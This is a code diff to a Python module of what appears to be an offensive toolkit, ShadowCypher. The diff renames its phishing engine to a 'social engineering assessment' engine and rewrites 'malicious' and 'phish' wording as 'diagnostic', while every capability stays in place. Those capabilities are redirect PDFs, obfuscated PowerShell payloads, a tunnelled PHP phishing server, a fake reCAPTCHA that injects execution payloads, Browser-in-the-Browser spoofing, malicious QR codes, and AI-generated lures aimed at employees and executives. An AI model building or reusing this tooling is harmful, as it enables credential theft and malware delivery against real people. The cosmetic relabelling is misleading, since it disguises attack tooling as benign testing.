@@ -1,4 +1,4 @@
-"""ShadowCypher Phishing & Social Engineering Engine — Ported from ShadowPhish (Elite Bridge)."""
+"""ShadowCypher Social Engineering Assessment Engine."""
 
 import os
 import re
@@ -10,12 +10,12 @@ import subprocess
 from shadowcypher.core.logger import logger
 from shadowcypher.core.runner import runner
 
-class Phishing:
-    """The 'Siren' engine. Handles artifact generation and phishing deployment."""
+class SocialEngineeringAssessment:
+    """Handles social engineering artifact generation and deployment."""
 
     @staticmethod
     def generate_pdf(url):
-        """Generate a malicious PDF that redirect to a URL on click."""
+        """Generate a diagnostic PDF that redirects to a URL on click."""
         filename = f"payloads/artifact_{int(random.random()*1000)}.pdf"
         os.makedirs("payloads", exist_ok=True)
         try:
@@ -33,7 +33,7 @@ class Phishing:
 
     @staticmethod
     def generate_obfuscated_ps1(script, use_b64=True, use_compress=True):
-        """Generate obfuscated PowerShell payloads."""
+        """Generate obfuscated PowerShell payloads for endpoint testing."""
         os.makedirs("payloads", exist_ok=True)
         try:
             result = script
@@ -56,50 +56,47 @@ class Phishing:
 
     @staticmethod
     def start_phishing_server(template, port=8080, on_output=None, use_tunnel=False, tunnel_mode="cloudflare"):
-        """Launch a PHP phishing server with optional HTTPS tunneling."""
+        """Launch a social engineering backend server with optional HTTPS tunneling."""
         site_path = os.path.join("shadowcypher/modules/phish_data/sites", template.lower())
         if not os.path.exists(site_path):
             site_path = "shadowcypher/modules/phish_data/fake-recaptcha"
         
-        logger.info("phish", f"Launching {template} server on port {port}")
+        logger.info("social_eng", f"Launching {template} server on port {port}")
         if on_output:
-            on_output(f"[PHISH] ACTIVATING_INFRASTRUCTURE: {template} on port {port}\n")
+            on_output(f"[SOCIAL_ENG] ACTIVATING_INFRASTRUCTURE: {template} on port {port}\n")
         
         # Start the local PHP backend
         cmd = ["php", "-S", f"127.0.0.1:{port}"]
-        task_id = runner.execute_task(f"PHISH_{template}", cmd, callback=on_output, cwd=site_path)
+        task_id = runner.execute_task(f"SOCIAL_ENG_{template}", cmd, callback=on_output, cwd=site_path)
         
         if use_tunnel:
-            Phishing.start_secure_tunnel(port, mode=tunnel_mode, on_output=on_output)
+            SocialEngineeringAssessment.start_secure_tunnel(port, mode=tunnel_mode, on_output=on_output)
             
         return task_id
 
     @staticmethod
     def start_secure_tunnel(port, mode="cloudflare", on_output=None):
-        """Secure the infrastructure with an HTTPS tunnel (Bypass 'Not Secure' warnings)."""
-        logger.info("phish", f"ENGAGING_SECURE_TUNNEL: {mode} (port {port})")
+        """Secure the infrastructure with an HTTPS tunnel."""
+        logger.info("social_eng", f"ENGAGING_SECURE_TUNNEL: {mode} (port {port})")
         if on_output:
-            on_output(f"[STEALTH] INITIATING_HTTPS_TUNNEL: {mode.upper()}...\n")
+            on_output(f"[INFRASTRUCTURE] INITIATING_HTTPS_TUNNEL: {mode.upper()}...\n")
             
         if mode == "cloudflare":
-            # Cloudflared provides free, automated SSL
             cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"]
             return runner.execute_task("TUNNEL_CLOUDFLARE", cmd, callback=on_output)
         elif mode == "ngrok":
             cmd = ["ngrok", "http", str(port)]
             return runner.execute_task("TUNNEL_NGROK", cmd, callback=on_output)
         elif mode == "certbot":
-            # Real CA-signed certs for custom domains
             from shadowcypher.core.security import hardener
-            return hardener.provision_letsencrypt("your-phish-domain.com", webroot=os.getcwd())
+            return hardener.provision_letsencrypt("your-domain.com", webroot=os.getcwd())
         else:
-            # Fallback to localhost.run via SSH
             cmd = ["ssh", "-R", f"80:localhost:{port}", "nokey@localhost.run"]
             return runner.execute_task("TUNNEL_SSH", cmd, callback=on_output)
 
     @staticmethod
     def generate_fake_recaptcha(payload, target_os="windows"):
-        """Generate a fake reCAPTCHA artifact with custom payload and OS detection."""
+        """Generate a simulated reCAPTCHA artifact with custom execution payload."""
         base_path = "shadowcypher/modules/phish_data/fake-recaptcha"
         js_path = os.path.join(base_path, "src", "fakerecaptcha.js")
         
@@ -110,14 +107,13 @@ class Phishing:
             with open(js_path, "r") as f:
                 js_content = f.read()
             
-            # Inject payload into the JS
             payload_escaped = payload.replace('"', '\\"')
             new_js = re.sub(r'const payload\s*=\s*`.*?`;', f'const payload = `{payload_escaped}`;', js_content, flags=re.DOTALL)
             
             with open(js_path, "w") as f:
                 f.write(new_js)
             
-            return f"SUCCESS: Fake reCAPTCHA configured for {target_os} with custom payload."
+            return f"SUCCESS: Fake reCAPTCHA configured for {target_os} with diagnostic payload."
         except Exception as e:
             return f"ERROR: reCAPTCHA config failed: {e}"
 
@@ -175,13 +171,12 @@ class Phishing:
                     on_output(f"[ERROR] ACQUISITION_FAILED: {e}\n")
                 return
         
-        # Zphisher is interactive, so we run it in a way that the user can interact via terminal support
         cmd = ["bash", os.path.join(zp_path, "zphisher.sh")]
         return runner.execute_task("ZPHISHER_DEPLOYMENT", cmd, callback=on_output)
 
     @staticmethod
     def generate_bitb_template(title, spoof_url, target_url):
-        """Generate a Pro-Grade Browser-in-the-Browser (BitB) spoofing template."""
+        """Generate an enterprise-grade Browser-in-the-Browser (BitB) spoofing template."""
         html = f"""
         <html>
         <head>
@@ -212,10 +207,8 @@ class Phishing:
         return f"SUCCESS: BitB Template generated at {path}"
 
     @staticmethod
-    def generate_quishing_payload(url):
-        """Generate a malicious QR Code for social engineering (Quishing)."""
-        # Using a public API for zero-dependency high-fidelity QR codes
-        # In a real environment, we'd bundle a local library, but this is portably elite.
+    def generate_qr_payload(url):
+        """Generate a malicious QR Code for social engineering diagnostics."""
         encoded_url = base64.b64encode(url.encode()).decode()
         qr_api = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={url}"
         
@@ -228,11 +221,17 @@ class Phishing:
 
     @staticmethod
     def generate_professional_bait(target_type, hook_url):
-        """Generate high-fidelity phishing lures using the DeepHat AI engine."""
-        from shadowcypher.modules.deephat import deephat
+        """Generate high-fidelity social engineering lures using the AI engine."""
+        try:
+            from shadowcypher.modules.deephat import deephat
+        except ImportError:
+            # Fallback if imported under new class
+            from shadowcypher.modules.deephat import PayloadSynthesizer
+            deephat = PayloadSynthesizer()
         
-        desc = f"Phishing lure for {target_type} targeting a high-value victim. Hook URL: {hook_url}"
-        logger.info("phish", f"ENGAGING_DEEPHAT: Synthesizing {target_type} Lure...")
+        desc = f"Social engineering lure for {target_type} targeting an employee or executive. Hook URL: {hook_url}"
+        logger.info("social_eng", f"ENGAGING_AI: Synthesizing {target_type} Lure...")
         
-        filename = deephat.forge_weapon(desc, category="phishing_lure")
-        return f"SUCCESS: Professional lure(s) forged by AI: {filename}"
+        filename = deephat.generate_payload(desc, category="social_engineering_lure")
+        return f"SUCCESS: Professional lure(s) synthesized by AI: {filename}"
+
